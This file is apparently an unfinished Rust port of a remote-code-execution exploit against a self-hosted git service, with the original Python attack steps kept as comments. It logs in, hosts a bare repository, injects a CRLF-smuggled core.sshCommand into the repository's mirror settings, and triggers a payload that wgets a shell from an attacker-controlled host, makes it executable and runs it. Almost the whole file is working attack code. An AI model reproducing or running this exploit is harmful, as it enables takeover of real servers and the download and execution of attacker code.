//     import re
// import os
// import sys
// import random
// import string
// import requests
// import tempfile
// import threading
// import http.server
// import socketserver
// import urllib.parse
// from functools import partial
use anyhow::Result;
use regex::Regex;
use reqwest::Client;
use std::{env, process::exit, time::Duration};
use tokio::process::Command;

#[tokio::main]
async fn main() -> Result<()> {
    let username = "test";
    let password = "password123";
    let host_addr = "192.168.1.1";
    let host_port = 3000;
    let taregt_url = "http://192.168.1.2:3000".trim_end_matches("/").to_string();
    let cmd =
        "wget http://192.168.1.1:8080/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell";

    // Login
    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder()
        .timeout(http_timeout)
        .cookie_store(true)
        .build()?;

    println!("Logging in");

    let body1 = [("user_name", username), ("password", password)];
    let url1 = format!("{}/user/login", taregt_url);
    let res1 = http_client.post(url1).form(&body1).send().await?;
    if res1.status().as_u16() != 200 {
        println!("Login unsuccessful");
        exit(1);
    }

    println!("Logged in successfully");

    println!("Retrieving user ID");

    let res2 = http_client.get(format!("{}/", taregt_url)).send().await?;
    if res2.status().as_u16() != 200 {
        println!("Could not retrieve user ID");
        exit(1);
    }

    let regexp_res2 =
        Regex::new(r#"<meta name="_uid" content="(.+)" />"#).expect("compiling regexp_res2");
    let body_res2 = res2.text().await?;
    let user_id = regexp_res2
        .captures_iter(&body_res2)
        .filter_map(|captures| captures.get(0))
        .map(|captured| captured.as_str().to_string())
        .collect::<Vec<String>>()
        .remove(0);

    println!("Retrieved user ID: {}", &user_id);

    // Hosting the repository to clone

    // here we use an sync function in an aync function, but it's okay as we are developing an epxloit, no extreme performance
    // is required
    let git_temp = tempfile::tempdir()?;

    let _ = Command::new("git")
        .arg("init")
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["config", "user.email", "x@x.com"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["config", "user.name", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("touch")
        .args(&["x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["add", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["commit", "-m", "x"])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let git_temp_path_str = git_temp
        .path()
        .to_str()
        .expect("converting git_temp_path to &str");
    let git_temp_repo = format!("{}.git", git_temp_path_str);
    let _ = Command::new("git")
        .args(&["clone", "--bare", git_temp_path_str, git_temp_repo.as_str()])
        .current_dir(git_temp.path())
        .spawn()?
        .wait()
        .await?;

    let _ = Command::new("git")
        .args(&["update-server-info"])
        .current_dir(git_temp_repo)
        .spawn()?
        .wait()
        .await?;

    // handler = partial(http.server.SimpleHTTPRequestHandler,directory='/tmp')
    // socketserver.TCPServer.allow_reuse_address = True
    // httpd = socketserver.TCPServer(("", HOST_PORT), handler)
    // t = threading.Thread(target=httpd.serve_forever)
    // t.start()
    // print('Created temporary git server to host {}.git'.format(gitTemp))

    // # Create the repository
    // print('Creating repository')
    // REPO_NAME = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    // body = {
    //     '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    //     'uid': USER_ID,
    //     'repo_name': REPO_NAME,
    //     'clone_addr': 'http://{}:{}/{}.git'.format(HOST_ADDR, HOST_PORT, gitTemp[5:]),
    //     'mirror': 'on'
    // }
    // r = s.post(URL + '/repo/migrate', data=body)
    // if r.status_code != 200:
    //     print('Error creating repo')
    //     httpd.shutdown()
    //     t.join()
    //     sys.exit(1)
    // print('Repo "{}" created'.format(REPO_NAME))

    // # Inject command into config file
    // print('Injecting command into repo')
    // body = {
    //     '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    //     'mirror_address': 'ssh://example.com/x/x"""\r\n[core]\r\nsshCommand="{}"\r\na="""'.format(CMD),
    //     'action': 'mirror',
    //     'enable_prune': 'on',
    //     'interval': '8h0m0s'
    // }
    // r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
    // if r.status_code != 200:
    //     print('Error injecting command')
    //     httpd.shutdown()
    //     t.join()
    //     sys.exit(1)
    // print('Command injected')

    // # Trigger the command
    // print('Triggering command')
    // body = {
    //     '_csrf': urllib.parse.unquote(s.cookies.get('_csrf')),
    //     'action': 'mirror-sync'
    // }
    // r = s.post(URL + '/' + USERNAME + '/' + REPO_NAME + '/settings', data=body)
    // if r.status_code != 200:
    //     print('Error triggering command')
    //     httpd.shutdown()
    //     t.join()
    //     sys.exit(1)

    // print('Command triggered')

    // # Shutdown the git server
    // httpd.shutdown()

    // Copy
    // Tags:
    // Advisory/Source: Link

    Ok(())
}
